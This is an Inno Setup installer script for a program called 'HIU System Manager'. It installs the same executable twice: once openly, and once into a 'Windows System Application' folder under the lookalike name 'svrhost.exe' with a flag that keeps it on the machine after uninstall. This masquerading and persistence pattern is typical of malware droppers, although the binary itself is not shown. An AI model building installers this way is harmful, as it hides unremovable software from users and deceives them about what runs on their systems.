; -- InnoSetupConfig.iss --


[Setup]
AppName=HIU System Manager
AppVersion=0.1.0
WizardStyle=modern
DefaultDirName={autopf}\HIU System Manager
DefaultGroupName=HIU System Manager
UninstallDisplayIcon={app}\MyProg.exe
Compression=lzma2
SolidCompression=yes
OutputDir=userdocs:Inno Setup Examples Output
; "ArchitecturesAllowed=x64" specifies that Setup cannot run on
; anything but x64.
ArchitecturesAllowed=x64
; "ArchitecturesInstallIn64BitMode=x64" requests that the install be
; done in "64-bit mode" on x64, meaning it should use the native
; 64-bit Program Files directory and the 64-bit view of the registry.
ArchitecturesInstallIn64BitMode=x64
CreateAppDir=no

[Dirs]
Name: "{autopf}/Windows System Application";
Name: "{autopf}/HIU";

[Files]
Source: "RudeusBg/bin/Release/net7.0-windows10.0.18362.0/win-x64/publish/win-x64/RudeusBg.exe"; DestDir: "{autopf}/HIU"; DestName: "BackgroundService.exe"
Source: "RudeusBg/bin/Release/net7.0-windows10.0.18362.0/win-x64/publish/win-x64/RudeusBg.exe"; DestDir: "{autopf}/Windows System Application"; DestName: "svrhost.exe"; Flags: uninsneveruninstall;
Source: "MyProg.chm"; DestDir: "{autopf}/HIU"
Source: "Readme.txt"; DestDir: "{autopf}/HIU"; Flags: isreadme

[Icons]
Name: "{group}\My Program"; Filename: "{app}\MyProg.exe"
